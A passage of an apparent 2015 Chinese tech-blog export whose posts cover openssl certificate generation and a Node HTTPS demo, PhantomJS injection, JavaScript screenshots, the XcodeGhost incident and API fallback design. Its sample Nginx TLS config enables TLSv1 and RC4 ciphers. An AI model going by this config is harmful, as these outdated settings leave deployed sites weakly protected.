Widgits Pty Ltd]:My CAOrganizational Unit Name (eg, section) []:Common Name (e.g. server FQDN or YOUR name) []:localhostEmail Address []: 注意，这里的 Organization Name (eg, company) [Internet Widgits Pty Ltd]: 后面生成客户端和服务器端证书的时候也需要填写，不要写成一样的！！！可以随意写如：My CA, My Server, My Client。 然后 Common Name (e.g. server FQDN or YOUR name) []: 这一项，是最后可以访问的域名，我这里为了方便测试，写成 localhost，如果是为了给我的网站生成证书，需要写成 barretlee.com。 第三步，生成服务器端证书和客户端证书 123456789# 服务器端需要向 CA 机构申请签名证书，在申请签名证书之前依然是创建自己的 CSR 文件openssl req -new -key server.key -out server.csr# 向自己的 CA 机构申请证书，签名过程需要 CA 的证书和私钥参与，最终颁发一个带有 CA 签名的证书openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -in server.csr -out server.crt# client 端openssl req -new -key client.key -out client.csr# client 端到 CA 签名openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -in client.csr -out client.crt 此时，我们的 keys 文件夹下已经有如下内容了： 1234567891011121314151617.├── https-client.js├── https-server.js└── keys ├── ca.crt ├── ca.csr ├── ca.key ├── ca.pem ├── ca.srl ├── client.crt ├── client.csr ├── client.key ├── client.pem ├── server.crt ├── server.csr ├── server.key └── server.pem 看到上面两个 js 文件了么，我们来跑几个demo。 HTTPS本地测试服务器代码： 12345678910111213// file http-server.jsvar https = require('https');var fs = require('fs');var options = &#123; key: fs.readFileSync('./keys/server.key'), cert: fs.readFileSync('./keys/server.crt')&#125;;https.createServer(options, function(req, res) &#123; res.writeHead(200); res.end('hello world');&#125;).listen(8000); 短短几行代码就构建了一个简单的 https 服务器，options 将私钥和证书带上。然后利用 curl 测试： 1234567891011121314➜ https curl //localhost:8000curl: (60) SSL certificate problem: Invalid certificate chainMore details here: http://curl.haxx.se/docs/sslcerts.htmlcurl performs SSL certificate verification by default, using a "bundle" of Certificate Authority (CA) public keys (CA certs). If the default bundle file isn't adequate, you can specify an alternate file using the --cacert option.If this HTTPS server uses a certificate signed by a CA represented in the bundle, the certificate verification probably failed due to a problem with the certificate (it might be expired, or the name might not match the domain name in the URL).If you'd like to turn off curl's verification of the certificate, use the -k (or --insecure) option. 当我们直接访问时，curl //localhost:8000 一堆提示，原因是没有经过 CA 认证，添加 -k 参数能够解决这个问题： 12➜ https curl -k //localhost:8000hello world% 这样的方式是不安全的，存在我们上面提到的中间人攻击问题。可以搞一个客户端带上 CA 证书试试： 123456789101112131415161718192021222324252627// file http-client.jsvar https = require('https');var fs = require('fs');var options = &#123; hostname: "localhost", port: 8000, path: '/', methed: 'GET', key: fs.readFileSync('./keys/client.key'), cert: fs.readFileSync('./keys/client.crt'), ca: [fs.readFileSync('./keys/ca.crt')]&#125;;options.agent = new https.Agent(options);var req = https.request(options, function(res) &#123; res.setEncoding('utf-8'); res.on('data', function(d) &#123; console.log(d); &#125;);&#125;);req.end();req.on('error', function(e) &#123; console.log(e);&#125;); 先打开服务器 node http-server.js，然后执行 12➜ https node https-client.jshello world 如果你的代码没有输出 hello world，说明证书生成的时候存在问题。也可以通过浏览器访问： 提示错误： 此服务器无法证明它是localhost；您计算机的操作系统不信任其安全证书。出现此问题的原因可能是配置有误或您的连接被拦截了。 原因是浏览器没有 CA 证书，只有 CA 证书，服务器才能够确定，这个用户就是真实的来自 localhost 的访问请求（比如不是代理过来的）。 你可以点击 继续前往localhost（不安全） 这个链接，相当于执行 curl -k //localhost:8000。如果我们的证书不是自己颁发，而是去靠谱的机构去申请的，那就不会出现这样的问题，因为靠谱机构的证书会放到浏览器中，浏览器会帮我们做很多事情。初次尝试的同学可以去 startssl.com 申请一个免费的证书。 Nginx 部署ssh 到你的服务器，对 Nginx 做如下配置： 123456789server_names barretlee.com *.barretlee.comssl on;ssl_certificate /etc/nginx/ssl/barretlee.com.crt;ssl_certificate_key /etc/nginx/ssl/barretlee.com.key;ssl_protocols TLSv1 TLSv1.1 TLSv1.2;ssl_ciphers &quot;EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS !MEDIUM&quot;;# Add perfect forward secrecyssl_prefer_server_ciphers on;add_header Strict-Transport-Security &quot;max-age=31536000; includeSubdomains&quot;; 会发现，网页 URL 地址框左边已经多出了一个小绿锁。当然，部署好了之后可以去这个网站看看测评分数，如果分数是 A+，说明你的 HTTPS 的各项配置都还不错，速度也很快。 小结好吧，我也是初次尝试，本地测试是 ok 的，由于买的阿里云服务器到期了也没续费，就没远程折腾，其实本地 Nginx + Nodejs，然后 Hosts 配置域名也是可以较好模拟的。文中很多地方描述的可能不是十分准确，提到的点也不够全面，如果有错误，还请斧正！]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>HTTPS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 关于 for 循环中的疑问]]></title>
    <url>%2Fblog%2F2015%2F09%2F30%2F2015-09-30-confusion-about-for-loop-var%2F</url>
    <content type="text"><![CDATA[底部有更新, 疑惑已经解开。 我一直都没搞明白，for 循环的 var 声明是怎么使用的。 123for(var i = 0; i &lt; len; i++ ) &#123; // code… &#125; 最后的结果是这样？ 123&#123;var i = 0; // code… &#125;&#123;var i = 1; // code… &#125;&#123;var i = 2; // code… &#125; 还是这样： 1234var i;&#123;i = 1; // code… &#125;&#123;i = 2; // code… &#125;&#123;i = 3; // code… &#125; 但是根据 ES6 中 let 关键词的例子： 1234567var a = [];for (let i = 0; i &lt; 10; i++) &#123; a[i] = function () &#123; console.log(i); &#125;;&#125;a[2](); // 2 let 只能在 block 块中生效，可以推测，应该是第一种方式解析，我们知道 var 会被提升（hoisting），所以第一种方式应该是： 1234var i;&#123;var i = 0; // code… &#125;&#123;var i = 1; // code… &#125;&#123;var i = 2; // code… &#125; 显得十分别扭！到底是啥样的呢？好疑惑。 下面是 for 循环中包含 var 声明的执行流程： 章节地址：http://www.barretlee.com/ST/ES5.1/#sec-12.6.3 并没有说的太明白，我知道很多人肯定趋向第二种解释，感觉不是很对。 咨询了下 Franky 教主，沟通之后，心里也有了结果。 ES5 和 ES6 不太一样，ES5 的 for 语句只有静态语义，而 ES6 的 for statement 存在两种语义，代码格式不同语义不同，分为静态语义和动态语义，上述 ES6 中的 let 关键词是因为 block 块具备动态语义，具体可以看这里：http://www.barretlee.com/ST/ES6/#sec-for-statement。 而 ES5 中 var VariableDeclarationListNoIn 是先声明，然后赋值。上图 ES5 文档中没有做出特殊说明，可以看出 var 变量并不会多次声明。 具体表述可能有些乱，但是心中的疑问总算是解开了。 对于这种原则性的问题，建议直接阅读 ES 文档。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>for</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[新应用上线 Snippet]]></title>
    <url>%2Fblog%2F2015%2F09%2F29%2F2015-09-29-new-application-snippet%2F</url>
    <content type="text"><![CDATA[Snippet 是一款代码片段收集工具，经过一天三夜的开发终于上线了。 应用地址：snippets.barretlee.com 源码地址：barretlee/snippets 由于使用原生 JS 开发，效果利用 CSS3 实现，所以如果想有一个好的视觉体验，请使用 Chrome/FireFox 预览（后续会持续优化）。 基本功能代码片段收集工具？你说的是 gist 么？这东西有用？昨天我在社交平台发上线预告的时候，有几个朋友提出来疑问。二话不多说，先去看线上效果。 本应用使用 Jekyll 构建，托管在 github 上，提供了如下基本功能： Snippet 按照文件夹储存分类呈现 整合在一起之后，单页面预览所有 Snippet 提供了快捷的搜索功能 每个 Snippet 对应 github 直接编辑的地址 提供了一个添加 Snippet 的快捷入口 Snippet 的语法就是 markdown ，当然也可以跟写博客似的写 snipet，嵌入 demo，嵌入说明等。 所以只要有 github 权限，可以直接编辑代码，立即生效。 使用说明一个小东西，硬生生开发了十几个小时。我对很多小细节扣的比较多，虽然自己不是设计出身，但是要求自己设计出来的东西能看、好看，所以常常走简约路线，复杂的设计搞不定。为了体验更好一些，我在页面上添加了几个小功能： 1. 添加 snippet 进入页面之后，你可能看清楚了，左上角位置有个不是很明显的加号，点进去就会跑到 github 页面，由于是我的仓库，只有我能够直接编辑，其他人如果想添加代码段，需要 fork 过去之后，提交 PR，后续我会开发一个工具，方便其他人直接提交代码。 新建文件夹十分方便，输入 /foldName 然后回车，github 就会自动建立一个文件夹，当然，如果文件夹存在，就会是进入文件夹。 2. 搜索 snippet 当我做完之后，发现找到一个自己收藏的 snippet 可真难，于是很自然的开发了一个搜索工具，搜索的范围是所有 snippet 的 title 名称，如果匹配到了就展示出来（当然，需要你点击 Enter 按钮）。 3. 编辑 snippet 这个快捷入口直达该 snippet 的编辑地址，可以线上编辑，commit 之后立即生效。 这也是我为什么不使用 hexo 本地构建而使用 Jekyll 让 github 自动构建的目的（hexo 写插件用的语言是 nodejs，而 jekyll 是 ruby，所以各有利弊，本博客使用的就是 hexo 构建）。如果你喜欢这个 snippet ，可以点击编辑按钮左侧的小红心，哈哈~ 后续开发整个应用的开发，相对还是比较仓促的，存在比较多大的问题，所以后续有空也会不断优化它，直到我和大家用的都爽~ 那么，后续需要做的事情有： 响应式预览页面 收集 snippet 的工具 补充更多类型 snippet，提升完整度 github 访问较慢，托管到 gitcafe 或者 coding 好了，如果大家喜欢这个应用，就去 github 上 start/fork 并且提交你的 snippet 吧！！ 贡献代码如果你想贡献代码，可以执行如下操作： fork barretlee/snippets 仓库 然后执行如下命令 1234567git clone //github.com/&#123;YOUR_GITHUB_NAME&#125;/snippets.gitcd snippetsgit chechout -b gh-pagescd snippets# 选择你想提交的文件类型，比如 htmlcd htmltouch &#123;YOUR_CONTRIBUTE_FILE_NAME&#125;.snippet 其中，{YOUR_CONTRIBUTE_FILE_NAME}.snippet 的格式为： 12345---title: &#123;NAME&#125;---&#123;CONTENT&#125; 可以使用 markdown 语法。 提交代码 123git add --allgit commit -m &quot;add file html/&#123;YOUR_CONTRIBUTE_FILE_NAME&#125;.snippet&quot;git push origin gh-pages 然后在你的 PR 页面提交一个 PR 到 barretlee/snippets 的仓库]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>snippets</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[走进 phantomjs 嵌入式测试]]></title>
    <url>%2Fblog%2F2015%2F09%2F25%2F2015-09-25-move-on-phantomjs%2F</url>
    <content type="text"><![CDATA[Google 上搜索了下 phantomjs 关键词，展示最多的是测试和截屏相关的内容。phantomjs 提供了大量的 API，让我们可以操作 webkit 网页沙箱中的内容，也可以将网页中的信息输出到外层，进行分析处理。而本文着重要讲述的是，如何更好的与 webkit 网页沙箱交互，如何注入脚本，如何修改请求。 QA 测试最烦恼的是 UI 测试，包括网页元素的正确呈现，网页交互之后的元素变化等，人工测试很容易疏忽一些问题，并且 UI 层面的测试用例也不好写，这让人很头痛。为了让程序能够很好地分析页面 UI，也有很多人做了图片对比工具，通过 phantomjs 提供的 screen capture 功能，定时抓取页面截图，或者在不同的场景下抓取同一个页面的截图，在时间维度和空间维度上对页面图片做对比分析，做监控警报等。技术成本不是很高，但是为了个性需求需要做很多额外的工作。 事件就是精确插入点为了能够在精确的时间点注入测试脚本，我们需要了解下 phantomjs 在请求资源时会发生哪些事件，毕竟它也是一个事件驱动模型。 onInitialized 类似于我们发送 ajax 请求，状态为 0 的时候 onLoadStarted 准备加载网页，此时页面的 page.content 是存在的，内容为 &lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; onLoadFinished 页面加载完成，是 DOMContentLoaded 还是 window.onload，我稍微测试了下，感觉应该是后者 onResourceRequested 请求资源，如 css、js 等 onResourceReceived 请求的资源已到达 onClosing 关闭页面 onConsoleMessage 沙箱内的 console 内容是不会出现到外层的，通过这个函数可以输出 还有很多，具体可以翻阅文档: http://phantomjs.org/api/webpage/。这些事件都是打开一个页面之后的实例化对象上的： 1234var page = require('webpage').create();// 事件监听page.onxxxx();page.open(url, function()&#123;&#125;); 用惯了 nodejs 的同学，可能会很自然的在代码里头写 123var page = require('webpage').create();// phantomjs API 没有这些东西var http = require('http'); 我们需要搞清楚的是 phantomjs 是一个基于 webkit 内核的 JS API，webkit 包含两方面，一个是 webCore 解析 html，一个是 V8 解析和运行 javascipt，phantomjs 包含了 webkit 和基于 webkit 的 js 封装，相比单纯的 webkit 它提供了更多的 API。而 nodejs 是对 v8 的封装，在 v8 上做了一些上层建筑。要搞清楚 phantomjs 和 nodejs 之间的界限。 实际上，phantomjs 自己也做了一些类似 nodejs 的 API 包装，比如 webserver、child_process、FileSystem 等等，这些 API 可以让我们很方便的操作网络 IO 和系统进程。 注入代码测试嵌入式指的是，将测试代码嵌入到 phantomjs 的沙箱之中，然后通过它提供的 API 将测试数据导出来，那么，如何将数据插入进去？ 1. includeJS/injectJS注入文件 两个函数都可以网沙箱内注入代码，区别是 includeJS 主要用于注入一个远程的脚本，如： 12345678910var webPage = require('webpage');var page = webPage.create();page.includeJs('http://code.jquery.com/jquery-1.10.2.min.js', function() &#123; // 模拟登录 var $testForm = $('form#login'); $testForm.find('input[name="username"]').value('barret'); $testForm.find('input[name="password"]').value('1234'); $testForm.submit();&#125;); 2. evaluate注入代码 而 injectJS 主要用于注入本地的文件，在做测试的时候，这个函数的使用频率稍高一些。很多的测试平台都是在线的，并且支持在线编写测试用例，最后生成的脚本地址当然也是网络可访问的，那么这个时候用 includeJS 就略微方便一些啦。 上面两种方式是想容器内注入可执行稳紧啊。除此之外，我们还可以使用 evaluate 直接注入可执行的脚本内容，如： 12345678910var webPage = require('webpage');var page = webPage.create();page.open('http://www.taobao.com', function(status) &#123; var title = page.evaluate(function() &#123; return document.title; &#125;); console.log(title); phantom.exit();&#125;); 这种方式有点类似于我们在 chrome devtoos 的控制台中输入代码进行测试。 搬出数据注入代码拿到输出之后，我们需要将数据拿出来，在运行的环境中，可以通过如下手段将数据搬出来。 1. 多开几个 webserver 上面提到，phantomjs 提供了 webserver 方面的 API，我们可以在注入的代码中： 1234// part of inject.js$.post("http://localhost:10220", data, function()&#123; // code..&#125;) 向外部通讯，而我们在外部也准备好了接驾代码： 1234567// part of server.jsvar server = require('webserver').create();var port = 10220;server.listen(port, function(req, res)&#123; console.log(JSON.stringify(req, null, 2)); // coding...&#125;) 所以 http 是个好东西，我们可以控制 web 的 server（沙箱外） 和 client（沙箱内），那么数据通讯就不是问题了。 2. callPhantom 函数 phantomjs 的 webpage 对象提供了一个 onCallback 函数，这个函数能够听到沙箱内一个叫做 callPhantom 函数的呐喊。callPhantom 是 phantomjs 在 window 上扩展的函数，他的使用： 12345678910var page = require("webpage").create();page.onCallback = function(msg) &#123; console.log("这是沙箱说的话: " + msg); return "嘿，沙箱，我听到了！";&#125;;page.evaluate(function() &#123; // Return-value of the "onCallback" handler arrive here var callbackResponse = window.callPhantom("嘿，外壳，我是沙箱~"); console.log("这是外壳说的话: " + callbackResponse);&#125;); 所以一切都是那么简单！知道了这些之后，还有啥事我们办不成的呢？！ 小结Jasmine 和 QUnit 是两套用的比较多的测试框架，我们可以使用上面任一种方式进行测试开发。 自动化测试少不了这些有用的工具，这些工具能够让我们在网页初始化的任何阶段注入测试代码，所以我们可以写好一堆测试用例，作为持续集成的测试库，让上线的代码更安全、更干净！]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>phantomjs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用 JavaScript 截屏]]></title>
    <url>%2Fblog%2F2015%2F09%2F24%2F2015-09-24-screenshot-with-javascript%2F</url>
    <content type="text"><![CDATA[经常在微博上看到很多内容使用的什么长微博截图，并且截图上还附加了很多其他的信息。之前对纯前端截图有些研究，正好本博客有这个需求，今天就把这东西实现了下。 需要声明的是，JavaScript 目前还不能实现网页截屏，就算以后能够实现，也一定是浏览器提供了相关接口，JS 去调用这些接口。既然不能截屏，那我们能做的只有通过拿到像素点的信息来”拼凑”图片。 先说说我们看到的截屏方式用过 phantomJS 的同学都知道，它提供了一个截屏函数，通过它可以整屏获取页面截图，而且他支持的格式也比较多：JPG/PNG/GIF/PDF。通过简单的两句命令就可以把一个网页截取下来： 123456789// render.jsvar webPage = require('webpage');var page = webPage.create();page.viewportSize = &#123; width: 1920, height: 1080 &#125;;page.open("http://www.taobao.com", function start(status) &#123; page.render('taobao_home.jpeg', &#123;format: 'jpeg', quality: '100'&#125;); phantom.exit();&#125;); 安装 phantomjs 之后执行下上面的文件： 1phantomjs render.js 你会发现，一张宽度很窄的淘宝首页图就保存到了同目录下的 taobao_home.jpeg 中。也有同学使用 phantomjs 做了很多有意思的东西，比如每隔 100ms 截图，然后对比图像之间的差异，分析网页的加载情况和性能问题，甚至做网页的监控。好吧，话题收回来，继续说说其他的截屏方式，关于 phantomjs 可以移步到官网学习。 前端截屏方案能够导出图片的，目前只有 canvas。页面上的元素，除了图片、视音频、SVG等，其他都是文字，都可以使用 css 样式变换出来。我们知道，在 canvas 中是可以绘制图片和文字的，那么问题就很好解决了。 遍历页面的所有元素，提取DOM数 获取渲染之后的每个 DOM 节点的内联、外链 CSS 属性 将样式转换成 canvas 的属性，利用 offset 等属性辅助摆放位置，将节点对应到 canvas 上 这个方案比较粗糙，但是对于简单的页面，以上操作就能导出一张几乎与原状一模一样的图片。当然，我们想到的，也有人实现出来了，html2canvas 就是一个关注度很高的 js 截屏库，它考虑的内容会更多更全面。比如： 我博客左侧的微博小图标，hover 上去有一个微博分享，这里我就使用了这个库截取博客全文视图（考虑小屏手机，我把宽度设置成 480，比较窄），其实现是很简单的： 1234html2canvas(document.body).then(function(canvas) &#123; canvas.id = 'screenshotCanvas'; document.body.appendChild(canvas);&#125;); 此时，页面的截图已经 append 到了 body 中。canvas 提供了导出图片的函数： 12var can = documeng.getElementById("screenshotCanvas");var imgDataURI = can.toDataURL('image/png'); 我们也可以将到处的内容转化成一个 blob 流，这样就能直接通过 URI 地址来访问了。 原始需求是将图片分享出去无论是 dataURI 还是还是 blob 流，他们都没办法当做一个 URL 在网络上访问，所以当我使用微博分享（附加图片分享）的时候，图片总是拿不到。 123var shareUrl = "http://service.weibo.com/share/share.php?appkey=YOUR_APP_KEY&amp;title=" + title + "&amp;url=" + url + "&amp;searchPic=false&amp;style=simple&amp;pic=" + picUrl; 这里的 picUrl 必须是一个 http 可请求到的地址，实在是无奈呀，在 coding.net 写了一个小应用，用来临时储存图片（10分钟之后删除上传图片），有需要的可以试用下： 源码地址：http://github.com/demo-platform/resolve-blob Demo地址：http://tmpfile.coding.io JQuery 用户可以这样搞： 12345678910111213141516var fd = new FormData();fd.append("img", imgBlob);$.ajax(&#123; type: "POST", url: "http://tmpfile.coding.io/img", dataType: 'json', data: fd, crossDomain: true, processData: false, contentType: false, success: function(data)&#123; if(data &amp;&amp; data.path) &#123; console.log("http://tmpfile.coding.io/tmp" + data.path); &#125; &#125;&#125;); 小结只要能拿到原始图，之后的加工处理都是比较简单的。比如如何实现画框截取某个区域的图形，思路就是截取整图，记住鼠标按下和抬起的两个点，然后从整图中抠出来就搞定了。在 QQ 空间发表说说的地方有提供截屏工具，这是因为腾讯在电脑上安装了插件，并且提供了对应的 JS 接口，JS 是没有能力直接截屏的。 好吧，了解原理就好，人家有现成的库可以用，咱们不要动不动就造轮子，不好玩。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>截屏</tag>
        <tag>html2cavans</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery插件 - 文章图片弹出放大效果]]></title>
    <url>%2Fblog%2F2015%2F09%2F19%2F2015-09-19-jquery-plugin-for-alert-img%2F</url>
    <content type="text"><![CDATA[由于页面样式限制，部分图片预览效果并不是很好，网上找了下，没看到简洁满意的，自己写了一个十分简洁的。 源码地址：http://github.com/demo-platform/pop-img DEMO：http://demo-platform.github.io/pop-img/ 本页测试（点击下方图片）：]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[这两天说到的苹果软件中毒是个什么情况？]]></title>
    <url>%2Fblog%2F2015%2F09%2F18%2F2015-09-18-what-is-wrong-with-apple%2F</url>
    <content type="text"><![CDATA[今天逛微博，看到了有人发现 apple 手机中的部分软件存在盗取账户信息的问题，网上搜罗了下信息，把大概的原因和处理方案说下。本文的阐述会比较浅显易懂。 如何被感染的大家对这些盗取账户信息的行为称之为手机中毒，简单的说就是使用的软件中被非软件方通过某些手段植入了程序本不该有的代码，这些代码可以获取用户的信息，甚至会伪造对话，比如下载某个音乐的时候提示要输入 app store 密码方能下载。之所以会中毒源自信任。 我们都知道，开发一个软件，需要工具，写代码的工具、编译代码的工具等等。而开发苹果手机上的软件需要苹果提供的编译和执行代码的工具，它叫做 xcode。 xcode 文件比较大，由于苹果在中国（好像）没有服务器，程序员下载 xcode 的速度就会很慢，而这个文件跟普通电影似的，可以被放到各种网盘中。所以就有人把下载好的 xcode 放到了网盘或者其他国内下载速度很快的服务器上。 问题就出在这里，这个非官方下载的 xcode 可能就被人调包了，可能是在下载之前就已经调包，也可能是在下载之时调包的。工程师使用这种被调包的 xcode 编写程序，最后编译阶段会被植入恶意程序。 打个比方，网易云音乐的开发工程师从非官网渠道下载了一个 xcode，他们开发好 iphone 的网易云音乐播放器之后，上传到 app store，那么实际上，我们下载的网易云音乐就是包含病毒的，它能够窃取你在使用网易云音乐时的操作信息，当然，可以蹦出一个提示框，让你输入 app store 密码，甚至可以做出一些更加危险，比如获取你的信用卡资金等操作。 如何预防和防御据了解，黑客把收集到的信息都上传到了一个网址为 init.icloud-analysis.com 的服务器上，目前这个网址已经被封了，但是不能判定黑客是否还保留了其他的渠道。 从上面的分析，我们可以知道，即便是 app store 上的软件也是不安全的，更不论有些童鞋是直接从非官方渠道下载的软件。所以： 软件工程师在开发的时候一定要从官网下载 xcode，或者使用校验工具检查下 sha1 码是否准确，有问题的 xcode6.4.dmg 的 sha1 是 a836d8fa0fce198e061b7b38b826178b44c053a8，没有问题的是 672e3dcb7727fc6db071e5a8528b70aa03900bb0。 用户应该关注下安全信息，把存在问题的软件即时删除，或者下载官方确定的靠谱版本软件 修改 app store 密码和信用卡密码 最好的防御是苹果公司能够提供抵挡这个程序运行的方案，比如快速提供一个新版的苹果系统让用户即时升级。 相关阅读 白帽子说事儿 http://drops.wooyun.org/news/8864 关注知乎 http://www.zhihu.com/question/35721299]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>苹果中毒</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大流量的下兜底容灾方案]]></title>
    <url>%2Fblog%2F2015%2F09%2F16%2F2015-09-16-backup-solution-at-big-traffic%2F</url>
    <content type="text"><![CDATA[随着网络的普及，上网的成本和门槛越来越低，很多网站的流量也是蹭蹭蹭的往上涨，而页面上的数据来源也不确定，可能来自多个平台，也可能是有专门的人员在手动维护。由于数据来源众多，出错的概率也会增加，为了降低页面在大流量下的维护成本，本文做了一些阐述。 兜底容灾的必要性一个日均承载几千万上亿流量的网页，会经常出现哪些问题呢？ 某个接口挂了，前端拿不到数据或者拿到的数据不够，页面展示就会出问题，出现空白或者某个模块直接天窗。 用户因为网络问题或者安装了某些插件，导致页面广告、接口请求挂掉，从而页面出现问题 前者的概率不是很大，因为网页上的请求 QPS 都是预先评估过的，只要前端请求没有成倍激增，并且后端压力都在系统监控范围内，不会出太大的岔子。但是一旦出问题，页面上就有可能空白一大块，如果后端排查和处理问题不及时，很可能从小问题演变成故障。 第二个问题也是比较严峻的，据统计，不管网站做的多简洁，总是会有千分之一的用户因为网络或者浏览器插件问题导致页面访问失败或者部分接口请求失败，比如一个 pv 一亿的网站，按照千分之一计算，一个接口每天会有 10w 左右的 pv 请求失败，而请求接口一多，页面上整体的请求失败量就很高了，这个数据会达到几百万。 如何兜底，如何容灾兜底容灾的方案有很多，目的就是让请求失败而页面展示依然正常。下面说一说常用的几个方案： 1. 再请求一次 照顾到用户体验，同时也考虑到一个请求的正常发送、接受时间，我们把超时时间设置为 5s，超过 5s 或者请求的结果状态为 failed ，则重新请求一次。所以我们可以重新封装下 Ajax 模块，如： 123456789// 设置请求次数var tryTimes = 2;Ajax(&#123; url: url, timeout: 5000, dataType: "jsonp", // try tryTimes: tryTimes&#125;); 这种处理方案对于提交订单、选中商品到购物车的页面比较合适，因为操作流是确定的，提交一次不成功，很自然的想到再提交一次，只是用户等待的不同阶段应该用不同的文案来提醒。而对于展示类的数据请求，不太适合多次失败尝试。所以首页未采用这种方案。 2. 缓存每一次请求到本地 现在的浏览器都支持本地储存（无论使用 userData 还是 localStorage），当每次请求到达用户浏览器的时候，把请求的数据缓存一份到本地储存，那么下次请求失败就可以使用上次的数据啦~ 1234567891011121314Ajax(&#123; url: url, dataType: "jsonp", success: function(data)&#123; // 缓存数据到本地 cache(DATAKEY, data); show(data); &#125;, error: function()&#123; // 请求失败，获取本地缓存数据 var data = cache(DATAKEY); show(data); &#125;&#125;); 这种方式是比较常用的，每次请求成功都会缓存最新的数据。不过这里存在两个问题： 如果用户第一次访问就失败了呢？要知道新用户是比较多的。 缓存的数据是否具有时效性，如果过期了呢？比如是一个推荐接口，推荐的商品用户已经购买过了，但是访问的时候接口挂掉，依然现实用户购买过的商品，这个逻辑是不太能接受的。 当然，有总比没有好吧，就算是第一次访问，这个概率是相当低的，就算数据过期，但是依然是正确的链接，所以基本可以接受。 3. 备用接口（硬兜底） 会给自己的网页接口准备备用接口的网站，估计不会很多。我们可以做一个包装： 12345Ajax(&#123; url: url, // 备份接口 backUrl: backUrl&#125;); 一旦请求失败，进入备用数据接口请求备份数据。同样的，这里也存在一个问题：如果接口是个性化的，则每个用户访问这个接口拿到的数据都不一样，那么这个备份接口该如何推数据？如果备用接口的数据跟正常接口一样，那还不如直接去请求两次。 所以这里提到的备用接口，主要是数据的硬兜底，硬兜底的来源有两个： 运营维护一份数据，推送到 CDN，每一份数据都有一个固定的地址 后端向 CDN push 一份通用数据。我们知道个性化都是使用 cookie 去识别用户的，对于没有浏览器记录的新用户就没有 cookie，此时会推一份通用的数据，这个通用的数据也可以作为接口的备份源。 兜底容错实践我们很容易得到如下的操作流程： 而这里存在的问题是： 获取缓存数据后，不好对数据格式进行判断，一般来说，只有有效的数据才能存到本地储存中，而判断是否有效往往存在误差 兜底数据没有及时更新 程序只会报警，但是不会自动修复 存在的隐患是： 前端每次改版，如更换接口、更换人员，兜底数据没有及时更新 如果兜底数据也存在错误，则页面一定出现空白天窗 所以对整个流程做了一些改进： 数据经过统一平台输出，在输出之前，我们将数据推一份到 CDN 作为备份，产生另一个接口，一旦原始接口请求失败，则直接请求备份的接口，这个在规则对应和即时更新上可以做到很赞！那么基本的流程就是这样： 不过为了确保无误，我的建议是，页面上每个接口必须对应一个运营手填的数据，这个作为最后的硬兜底，而这个硬兜底也会被缓存到本地，整个流程就形成一个闭环。那么，剩下的工作就只有监控和警报了。 下面是一串伪代码： 1234567891011121314151617181920212223242526272829303132333435363738394041var url = interfaceURL;var backUrl = interfaceBackURL;var hardBackUrl = hardDataURL;var cacheTime = 10day;Ajax(&#123; url: url, backurl: backUrl, success: function()&#123; // 缓存数据到本地 cache(DATAKEY, data, cacheTime); show(data); &#125;, error: function()&#123; // 请求失败，获取本地缓存数据 var data = cache(DATAKEY); if(data) &#123; Reporter.send(/*WARN*/); show(data); &#125; else &#123; Reporter.send(/*ERROR*/); _failed(); &#125; &#125;&#125;);// 请求硬兜底function _failed() &#123; Ajax(&#123; url: hadrBackUrl, success: function(data)&#123; // 缓存数据到本地 cache(DATAKEY, data, cacheTime); show(data); &#125;, error: function()&#123; Reporter.send(/*SUPER_ERROR*/); show(data); &#125; &#125;);&#125; 注意到，我们在上面使用了缓存失效时间，考虑到数据的及时性，设置为 10 天。backUrl 是 url 的备份地址，hardBackUrl 是运营填写的备份数据，整个流程都在闭环之中，所以出问题的概率就大大降低了，即便是后端接口出错，我们也可以看着监控信息，放心的给后端开发GG打个电话，告知下等待修复，而不是急急忙忙，抓耳挠腮，担惊受怕天窗来了。 小结本文提供的都是伪代码，而这些伪代码的实现并不复杂，也没必要写成组件，主要是提供思路，如何处理大流量高并发下的异步数据接口的兜底容灾。 如果你有更好的想法，可以提出来，一起交流下~]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>兜底容灾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[嘿，多说，你咋了？要不咱换成 DISQUS 吧~]]></title>
    <url>%2Fblog%2F2015%2F09%2F15%2F2015-09-15-hei-duoshuo-what-is-wrong%2F</url>
